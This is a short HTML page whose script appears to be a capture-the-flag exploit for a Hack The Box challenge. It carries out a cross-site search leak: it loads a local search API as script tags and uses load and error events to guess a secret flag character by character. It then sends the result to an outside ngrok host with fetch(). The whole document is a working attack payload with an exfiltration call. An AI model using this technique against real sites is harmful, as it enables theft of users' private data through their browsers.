<html>
<script>
let localIp = '127.0.0.1:1337';
let flag = 'HTB{';
let letters = '!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
let url = 'http://127.0.0.1:1337/api/entries/search?q=';
async function getChunk(char){
  return new Promise((resolve, reject)=>{
    const script = document.createElement("script");
    script.src = url+encodeURIComponent(flag+char);
    script.onload = () => char==='}' ? reject(char):resolve(char);
    script.onerror = () => reject(char);
    document.head.appendChild(script);
  });
}
async function getFlag(chars) {
  let a = false;
  for(let i=0; i < chars.length; i++){
    await getChunk(chars[i]).then((res) => {flag=flag.concat(res); a = res==='x' ? true:false; i=0} , (res)=> { } );
    if(a) break;
  }
  fetch('http://8f10-157-100-198-203.ngrok.io/flag='+flag);
};
getFlag(letters);
</script>
<html>